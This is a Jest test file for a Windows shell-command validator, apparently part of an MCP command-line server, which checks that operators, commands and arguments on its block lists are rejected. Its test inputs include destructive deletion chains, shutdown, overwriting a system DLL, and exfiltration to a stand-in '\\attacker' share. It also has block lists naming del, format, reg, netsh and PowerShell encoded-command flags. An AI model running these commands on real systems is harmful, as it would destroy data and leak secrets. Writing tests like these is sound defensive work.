import { describe, test, expect, beforeEach } from '@jest/globals';
import {
  validateShellOperators,
  parseCommand,
  isCommandBlocked,
  isArgumentBlocked,
  extractCommandName,
  getBlockedCommandName,
  getBlockedArgument
} from '../../src/utils/validation.js';
import type { ShellConfig } from '../../src/types/config.js';

/**
 * Security Test Suite: Command Injection Attacks
 *
 * This test suite covers various command injection attack vectors including:
 * - Shell operator injection (&, |, ;, >, <, etc.)
 * - Command chaining and concatenation
 * - Argument injection and bypass attempts
 * - Quote escaping and manipulation
 * - Redirection attacks
 * - Blocked command detection
 * - Extension-based evasion
 *
 * References:
 * - OWASP Command Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
 * - Node.js Secure Coding: Command Injection: https://www.nodejs-security.com/book/command-injection
 */

describe('Command Injection Attack Vectors', () => {
  let mockShellConfig: ShellConfig;
  let blockedCommands: string[];
  let blockedArguments: string[];

  beforeEach(() => {
    mockShellConfig = {
      enabled: true,
      command: 'cmd.exe',
      args: ['/c'],
      blockedOperators: ['&', '|', ';', '`']
    };

    blockedCommands = ['rm', 'del', 'format', 'shutdown', 'reg', 'regedit', 'net', 'netsh'];
    blockedArguments = ['--exec', '-e', '/c', '-enc', '-encodedcommand', '-command', '--interactive', '-i'];
  });

  describe('Shell Operator Injection', () => {
    test('should block pipe operator (|)', () => {
      const maliciousCommand = 'dir | del /q *';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*\|/);
    });

    test('should block ampersand operator (&)', () => {
      const maliciousCommand = 'dir & del /q *';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*&/);
    });

    test('should block semicolon operator (;)', () => {
      const maliciousCommand = 'dir ; del /q *';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*;/);
    });

    test('should block backtick operator (`)', () => {
      const maliciousCommand = 'dir ` del /q *';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*`/);
    });

    test('should block output redirection (>)', () => {
      const maliciousCommand = 'echo malicious > evil.bat';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*>/);
    });

    test('should block input redirection (<)', () => {
      const maliciousCommand = 'malware < input.txt';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*</);
    });

    test('should block append redirection (>>)', () => {
      const maliciousCommand = 'echo @echo off >> autorun.bat';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*>>/);
    });

    test('should block error redirection (2>)', () => {
      const maliciousCommand = 'command 2> errors.log';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*2>/);
    });

    test('should block combined stream redirection (2>&1)', () => {
      const maliciousCommand = 'command 2>&1';
      // Will catch '&' since it's part of '2>&1' - defense in depth working correctly
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*(2>&1|&)/);
    });
  });

  describe('Command Chaining Attacks', () => {
    test('should block multiple commands with && (Windows)', () => {
      const maliciousCommand = 'dir && del /q *';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*&/);
    });

    test('should block multiple commands with || (Windows)', () => {
      const maliciousCommand = 'dir || del /q *';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*\|/);
    });

    test('should block command substitution with backticks (PowerShell)', () => {
      const maliciousCommand = 'echo `Get-Process`';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*`/);
    });

    test('should block nested command chaining', () => {
      const maliciousCommand = 'dir & (del /q * & shutdown /s)';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*&/);
    });

    test('should block multiple operators in single command', () => {
      const maliciousCommand = 'dir | findstr test & del *';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator/);
    });
  });

  describe('Quote Escaping and Manipulation', () => {
    test('should detect unclosed double quotes', () => {
      const maliciousCommand = 'echo "unclosed';
      expect(() => parseCommand(maliciousCommand))
        .toThrow(/Unclosed.*quote/);
    });

    test('should detect unclosed single quotes', () => {
      const maliciousCommand = "echo 'unclosed";
      expect(() => parseCommand(maliciousCommand))
        .toThrow(/Unclosed.*quote/);
    });

    test('should handle escaped quotes correctly', () => {
      const commandWithEscapedQuotes = 'echo \\"test\\"';
      const { command, args } = parseCommand(commandWithEscapedQuotes);
      expect(command).toBe('echo');
      expect(args).toContain('"test"');
    });

    test('should handle escaped backslashes', () => {
      const commandWithEscapedBackslash = 'echo \\\\test';
      const { command, args } = parseCommand(commandWithEscapedBackslash);
      expect(command).toBe('echo');
      expect(args).toContain('\\test');
    });

    test('should not allow operator injection via quote breaking', () => {
      // Attacker tries: echo "safe" | malicious
      const maliciousCommand = 'echo "safe" | del /q *';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*\|/);
    });

    test('should handle mixed quote types', () => {
      const mixedQuotes = 'echo "double" \'single\'';
      const { command, args } = parseCommand(mixedQuotes);
      expect(command).toBe('echo');
      expect(args).toEqual(['double', 'single']);
    });

    test('should handle quotes with spaces inside', () => {
      const quotedWithSpaces = 'echo "hello world" "test 123"';
      const { command, args } = parseCommand(quotedWithSpaces);
      expect(command).toBe('echo');
      expect(args).toEqual(['hello world', 'test 123']);
    });
  });

  describe('Blocked Command Detection', () => {
    test('should block exact command match', () => {
      expect(isCommandBlocked('del', blockedCommands)).toBe(true);
    });

    test('should block command with .exe extension', () => {
      expect(isCommandBlocked('del.exe', blockedCommands)).toBe(true);
    });

    test('should block command with .cmd extension', () => {
      expect(isCommandBlocked('del.cmd', blockedCommands)).toBe(true);
    });

    test('should block command with .bat extension', () => {
      expect(isCommandBlocked('del.bat', blockedCommands)).toBe(true);
    });

    test('should block command case-insensitively', () => {
      expect(isCommandBlocked('DEL', blockedCommands)).toBe(true);
      expect(isCommandBlocked('Del', blockedCommands)).toBe(true);
      expect(isCommandBlocked('dEl', blockedCommands)).toBe(true);
    });

    test('should block command with full path', () => {
      expect(isCommandBlocked('C:\\Windows\\System32\\shutdown.exe', blockedCommands)).toBe(true);
    });

    test('should block command with relative path', () => {
      expect(isCommandBlocked('..\\..\\del.exe', blockedCommands)).toBe(true);
    });

    test('should allow non-blocked commands', () => {
      expect(isCommandBlocked('dir', blockedCommands)).toBe(false);
      expect(isCommandBlocked('echo', blockedCommands)).toBe(false);
    });

    test('should extract correct command name from path', () => {
      expect(extractCommandName('C:\\Windows\\System32\\cmd.exe')).toBe('cmd');
      expect(extractCommandName('del.exe')).toBe('del');
      expect(extractCommandName('shutdown')).toBe('shutdown');
    });

    test('should get blocked command name for error reporting', () => {
      expect(getBlockedCommandName('del.exe', blockedCommands)).toBe('del');
      expect(getBlockedCommandName('SHUTDOWN', blockedCommands)).toBe('shutdown');
      expect(getBlockedCommandName('safe.exe', blockedCommands)).toBe(null);
    });
  });

  describe('Blocked Argument Detection', () => {
    test('should block --exec argument', () => {
      expect(isArgumentBlocked(['--exec'], blockedArguments)).toBe(true);
    });

    test('should block -e argument', () => {
      expect(isArgumentBlocked(['-e'], blockedArguments)).toBe(true);
    });

    test('should block /c argument', () => {
      expect(isArgumentBlocked(['/c'], blockedArguments)).toBe(true);
    });

    test('should block -enc argument (PowerShell encoding)', () => {
      expect(isArgumentBlocked(['-enc'], blockedArguments)).toBe(true);
    });

    test('should block -encodedcommand argument', () => {
      expect(isArgumentBlocked(['-encodedcommand'], blockedArguments)).toBe(true);
    });

    test('should block arguments case-insensitively', () => {
      expect(isArgumentBlocked(['--EXEC'], blockedArguments)).toBe(true);
      expect(isArgumentBlocked(['-E'], blockedArguments)).toBe(true);
      expect(isArgumentBlocked(['/C'], blockedArguments)).toBe(true);
    });

    test('should block argument in middle of list', () => {
      expect(isArgumentBlocked(['--help', '--exec', 'code'], blockedArguments)).toBe(true);
    });

    test('should allow safe arguments', () => {
      expect(isArgumentBlocked(['--help', '--version'], blockedArguments)).toBe(false);
    });

    test('should get blocked argument for error reporting', () => {
      expect(getBlockedArgument(['--exec'], blockedArguments)).toBe('--exec');
      expect(getBlockedArgument(['safe', '-e', 'test'], blockedArguments)).toBe('-e');
      expect(getBlockedArgument(['--help', '--version'], blockedArguments)).toBe(null);
    });

    test('should use regex matching for arguments', () => {
      // The blockedArguments use regex with ^ and $, so exact match only
      expect(isArgumentBlocked(['--exec-test'], blockedArguments)).toBe(false);
      expect(isArgumentBlocked(['test--exec'], blockedArguments)).toBe(false);
      expect(isArgumentBlocked(['--exec'], blockedArguments)).toBe(true);
    });
  });

  describe('Extension-Based Evasion Attempts', () => {
    test('should block command with .ps1 extension', () => {
      // extractCommandName should remove .ps1
      expect(extractCommandName('malicious.ps1')).toBe('malicious');
    });

    test('should block command with .vbs extension', () => {
      expect(extractCommandName('evil.vbs')).toBe('evil');
    });

    test('should block command with .js extension', () => {
      expect(extractCommandName('backdoor.js')).toBe('backdoor');
    });

    test('should block command with .com extension', () => {
      expect(extractCommandName('format.com')).toBe('format');
    });

    test('should block command with .scr extension', () => {
      expect(extractCommandName('malware.scr')).toBe('malware');
    });

    test('should block command with .msi extension', () => {
      expect(extractCommandName('installer.msi')).toBe('installer');
    });

    test('should block command with .pif extension', () => {
      expect(extractCommandName('game.pif')).toBe('game');
    });

    test('should block command with .wsf extension', () => {
      expect(extractCommandName('script.wsf')).toBe('script');
    });

    test('should block command with .hta extension', () => {
      expect(extractCommandName('app.hta')).toBe('app');
    });

    test('should handle multiple extensions', () => {
      expect(extractCommandName('test.exe.bat')).toBe('test.exe');
    });
  });

  describe('Command Parsing Edge Cases', () => {
    test('should handle empty command', () => {
      const { command, args } = parseCommand('');
      expect(command).toBe('');
      expect(args).toEqual([]);
    });

    test('should handle whitespace-only command', () => {
      const { command, args } = parseCommand('   ');
      expect(command).toBe('');
      expect(args).toEqual([]);
    });

    test('should handle single command without args', () => {
      const { command, args } = parseCommand('dir');
      expect(command).toBe('dir');
      expect(args).toEqual([]);
    });

    test('should handle command with single arg', () => {
      const { command, args } = parseCommand('echo test');
      expect(command).toBe('echo');
      expect(args).toEqual(['test']);
    });

    test('should handle command with multiple args', () => {
      const { command, args } = parseCommand('copy file1.txt file2.txt');
      expect(command).toBe('copy');
      expect(args).toEqual(['file1.txt', 'file2.txt']);
    });

    test('should handle Windows path with spaces in quotes', () => {
      const { command, args } = parseCommand('"C:\\Program Files\\app.exe" arg1');
      expect(command).toBe('C:\\Program Files\\app.exe');
      expect(args).toEqual(['arg1']);
    });

    test('should handle arguments with spaces in quotes', () => {
      const { command, args } = parseCommand('echo "hello world"');
      expect(command).toBe('echo');
      expect(args).toEqual(['hello world']);
    });

    test('should handle multiple quoted arguments', () => {
      const { command, args } = parseCommand('cmd "arg 1" "arg 2" "arg 3"');
      expect(command).toBe('cmd');
      expect(args).toEqual(['arg 1', 'arg 2', 'arg 3']);
    });

    test('should handle mixed quoted and unquoted args', () => {
      const { command, args } = parseCommand('cmd arg1 "arg 2" arg3');
      expect(command).toBe('cmd');
      expect(args).toEqual(['arg1', 'arg 2', 'arg3']);
    });

    test('should trim leading/trailing spaces', () => {
      const { command, args } = parseCommand('  echo   test  ');
      expect(command).toBe('echo');
      expect(args).toEqual(['test']);
    });

    test('should preserve tabs in command (tabs not treated as arg delimiters)', () => {
      // parseCommand only splits on spaces, not tabs - this is expected behavior
      const { command, args } = parseCommand('echo\ttest');
      expect(command).toBe('echo\ttest');
      expect(args).toEqual([]);
    });

    test('should handle consecutive spaces', () => {
      const { command, args } = parseCommand('echo    test    value');
      expect(command).toBe('echo');
      expect(args).toEqual(['test', 'value']);
    });
  });

  describe('Redirection Attack Vectors', () => {
    test('should block file overwrite with > redirection', () => {
      const maliciousCommand = 'echo malicious > C:\\Windows\\System32\\important.dll';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*>/);
    });

    test('should block file append with >> redirection', () => {
      const maliciousCommand = 'echo @malicious >> autoexec.bat';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*>>/);
    });

    test('should block reading from file with < redirection', () => {
      const maliciousCommand = 'malware < credentials.txt';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*</);
    });

    test('should block error stream redirection to file', () => {
      const maliciousCommand = 'command 2> nul';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*2>/);
    });

    test('should block combined stdout and stderr redirection', () => {
      const maliciousCommand = 'command > output.txt 2>&1';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator/);
    });
  });

  describe('PowerShell-Specific Injection', () => {
    test('should block PowerShell command substitution with backtick', () => {
      const maliciousCommand = 'echo `Get-Process`';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*`/);
    });

    test('should detect -encodedcommand argument (PowerShell obfuscation)', () => {
      expect(isArgumentBlocked(['-encodedcommand'], blockedArguments)).toBe(true);
    });

    test('should detect -enc shorthand for -encodedcommand', () => {
      expect(isArgumentBlocked(['-enc'], blockedArguments)).toBe(true);
    });

    test('should detect -command argument', () => {
      expect(isArgumentBlocked(['-command'], blockedArguments)).toBe(true);
    });

    test('should detect -e shorthand', () => {
      expect(isArgumentBlocked(['-e'], blockedArguments)).toBe(true);
    });
  });

  describe('Bypass Attempt Detection', () => {
    test('should block operator with extra spaces', () => {
      const maliciousCommand = 'dir  |  del /q *';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*\|/);
    });

    test('should block operator without spaces', () => {
      const maliciousCommand = 'dir|del';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*\|/);
    });

    test('should block operator at start of command', () => {
      const maliciousCommand = '& malicious';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*&/);
    });

    test('should block operator at end of command', () => {
      const maliciousCommand = 'dir &';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*&/);
    });

    test('should not be bypassed by line continuation', () => {
      // Even with newlines, operators should be blocked
      const maliciousCommand = 'dir |\ndel /q *';
      expect(() => validateShellOperators(maliciousCommand, mockShellConfig))
        .toThrow(/blocked operator.*\|/);
    });
  });

  describe('Real-World Attack Scenarios', () => {
    test('should block ransomware-style file deletion', () => {
      const ransomwareCommand = 'dir & del /s /q C:\\Users\\*.*';
      expect(() => validateShellOperators(ransomwareCommand, mockShellConfig))
        .toThrow(/blocked operator.*&/);
    });

    test('should block data exfiltration via redirection', () => {
      const exfilCommand = 'type secrets.txt > \\\\attacker\\share\\data.txt';
      expect(() => validateShellOperators(exfilCommand, mockShellConfig))
        .toThrow(/blocked operator.*>/);
    });

    test('should block privilege escalation attempts', () => {
      expect(isCommandBlocked('net', blockedCommands)).toBe(true);
      expect(isCommandBlocked('netsh', blockedCommands)).toBe(true);
    });

    test('should block system shutdown attempts', () => {
      expect(isCommandBlocked('shutdown', blockedCommands)).toBe(true);
    });

    test('should block registry modification attempts', () => {
      expect(isCommandBlocked('reg', blockedCommands)).toBe(true);
      expect(isCommandBlocked('regedit', blockedCommands)).toBe(true);
    });

    test('should block format command for disk destruction', () => {
      expect(isCommandBlocked('format', blockedCommands)).toBe(true);
    });
  });

  describe('Configuration Edge Cases', () => {
    test('should allow commands when blockedOperators is empty', () => {
      const permissiveConfig: ShellConfig = {
        enabled: true,
        command: 'cmd.exe',
        args: ['/c'],
        blockedOperators: []
      };
      const commandWithOperator = 'dir | findstr test';
      // Should not throw when no operators are blocked
      expect(() => validateShellOperators(commandWithOperator, permissiveConfig))
        .not.toThrow();
    });

    test('should allow commands when blockedOperators is undefined', () => {
      const permissiveConfig: ShellConfig = {
        enabled: true,
        command: 'cmd.exe',
        args: ['/c']
        // blockedOperators intentionally omitted
      };
      const commandWithOperator = 'dir | findstr test';
      expect(() => validateShellOperators(commandWithOperator, permissiveConfig))
        .not.toThrow();
    });

    test('should provide helpful error messages with config path', () => {
      const configPath = 'C:\\Users\\test\\.win-cli-mcp\\config.json';
      try {
        validateShellOperators('dir | del', mockShellConfig, configPath);
        expect(true).toBe(false); // Should not reach here
      } catch (error) {
        const errorMsg = error instanceof Error ? error.message : String(error);
        // Should mention how to fix and reference config
        expect(errorMsg).toMatch(/blocked operator/i);
        expect(errorMsg).toMatch(/fix/i);
      }
    });
  });

  describe('Performance and DoS Protection', () => {
    test('should handle very long commands efficiently', () => {
      const longCommand = 'echo ' + 'a'.repeat(10000);
      const startTime = Date.now();
      expect(() => validateShellOperators(longCommand, mockShellConfig)).not.toThrow();
      const duration = Date.now() - startTime;
      expect(duration).toBeLessThan(100); // Should complete in < 100ms
    });

    test('should handle many arguments efficiently', () => {
      const manyArgs = 'echo ' + Array(1000).fill('arg').join(' ');
      const startTime = Date.now();
      const { command, args } = parseCommand(manyArgs);
      const duration = Date.now() - startTime;
      expect(command).toBe('echo');
      expect(args.length).toBe(1000);
      expect(duration).toBeLessThan(100);
    });

    test('should handle deeply nested quotes efficiently', () => {
      const nestedQuotes = 'echo "a \\"b \\"c\\" d\\" e"';
      const startTime = Date.now();
      const { command, args } = parseCommand(nestedQuotes);
      const duration = Date.now() - startTime;
      expect(command).toBe('echo');
      expect(duration).toBeLessThan(50);
    });
  });
});
